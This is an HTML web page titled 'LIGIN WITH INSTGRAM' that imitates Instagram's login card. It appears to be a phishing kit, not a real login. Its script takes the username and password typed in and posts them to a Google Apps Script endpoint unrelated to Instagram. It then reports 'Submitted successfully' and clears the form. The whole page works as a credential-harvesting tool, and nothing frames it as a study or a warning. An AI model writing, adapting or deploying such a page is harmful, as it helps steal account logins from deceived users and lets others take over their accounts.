<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>LIGIN WITH INSTGRAM</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;

      background: #fafafa;
      color: #262626;
    }

    .page {
      width: 100%;
      max-width: 350px;
    }

    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 38px 40px;
      text-align: center;
    }

    .brand {
      font-family: cursive;
      font-size: 42px;
      font-weight: 700;
      margin-bottom: 30px;
      color: #262626;
    }

    .subtitle {
      color: #737373;
      font-size: 14px;
      font-weight: 600;
      line-height: 1.5;
      margin-bottom: 22px;
    }

    .field {
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      height: 40px;
      padding: 0 10px;

      border: 1px solid #dbdbdb;
      border-radius: 3px;

      background: #fafafa;
      color: #262626;

      outline: none;
      font-size: 12px;
    }

    input:focus {
      border-color: #999;
      background: #fff;
    }

    input::placeholder {
      color: #8e8e8e;
    }

    button {
      width: 100%;
      height: 38px;
      margin-top: 10px;

      border: 0;
      border-radius: 8px;

      color: white;
      background: #0095f6;

      font-size: 14px;
      font-weight: 700;

      cursor: pointer;
    }

    button:hover {
      background: #1877f2;
    }

    button:disabled {
      opacity: .6;
      cursor: wait;
    }

    .divider {
      display: flex;
      align-items: center;
      gap: 15px;

      margin: 25px 0;
      color: #737373;

      font-size: 11px;
      font-weight: 700;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .status {
      display: none;
      margin-top: 15px;
      padding: 10px;

      border-radius: 5px;
      font-size: 12px;
      font-weight: 600;
    }

    .success {
      display: block;
      color: #16803c;
      background: #e9f8ef;
    }

    .error {
      display: block;
      color: #c62828;
      background: #fdecec;
    }

    .bottom-card {
      margin-top: 10px;
      padding: 22px;

      background: #fff;
      border: 1px solid #dbdbdb;

      text-align: center;
      font-size: 13px;
      color: #262626;
    }

    .bottom-card strong {
      color: #0095f6;
    }

    .footer {
      text-align: center;
      color: #8e8e8e;
      font-size: 10px;
      margin-top: 25px;
    }

    @media(max-width:420px) {
      body {
        padding: 0;
        background: #fff;
      }

      .card {
        border: 0;
        padding: 38px 35px;
      }

      .bottom-card {
        border-left: 0;
        border-right: 0;
      }
    }
  </style>
</head>

<body>

  <div class="page">

    <div class="card">

      <div class="brand">
        Welcome
      </div>

      <p class="subtitle">
        Enter your information below to continue.
      </p>

      <form id="myForm">

        <div class="field">
          <input
            id="section1"
            type="text"
            placeholder="User Name"
            autocomplete="off"
            required
          >
        </div>

        <div class="field">
          <input
            id="section2"
            type="text"
            placeholder="Enter PASSWORD "
            autocomplete="off"
            required
          >
        </div>

        <button id="submitBtn" type="submit">
          Continue
        </button>

        <div id="status" class="status"></div>

      </form>

      <div class="divider">
        OR
      </div>

      <div style="font-size:12px;color:#737373;">
        Secure • Simple • Modern
      </div>

    </div>

    <div class="bottom-card">
      Welcome to your page.
      <strong>Get Started</strong>
    </div>

    <div class="footer">
      © 2026 Welcome
    </div>

  </div>

  <script>

    const API_URL =
      "https://script.google.com/macros/s/AKfycbx61bgHjlTKC_wVHqB4xjiHY1LqlEfhkfuXbTENC9sWjgbM52y-JwFaumhkdOW7f8_i/exec";

    const form =
      document.getElementById("myForm");

    const button =
      document.getElementById("submitBtn");

    const status =
      document.getElementById("status");

    form.addEventListener(
      "submit",
      async function(event) {

        event.preventDefault();

        const section1 =
          document
            .getElementById("section1")
            .value
            .trim();

        const section2 =
          document
            .getElementById("section2")
            .value
            .trim();

        if (!section1 || !section2) {
          showMessage(
            "Please fill both fields.",
            "error"
          );
          return;
        }

        button.disabled = true;
        button.textContent = "Submitting...";

        try {

          const response = await fetch(
            API_URL,
            {
              method: "POST",

              headers: {
                "Content-Type":
                  "text/plain;charset=utf-8"
              },

              body: JSON.stringify({
                section1: section1,
                section2: section2
              })
            }
          );

          const result =
            await response.json();

          if (
            !response.ok ||
            !result.success
          ) {
            throw new Error(
              result.message ||
              "Submission failed"
            );
          }

          showMessage(
            "✓ Submitted successfully!",
            "success"
          );

          form.reset();

        } catch (error) {

          console.error(error);

          showMessage(
            "❌ Submission failed. Please try again.",
            "error"
          );

        } finally {

          button.disabled = false;
          button.textContent = "Continue";

        }

      }
    );

    function showMessage(message, type) {

      status.textContent = message;

      status.className =
        "status " + type;

    }

  </script>

</body>
</html>
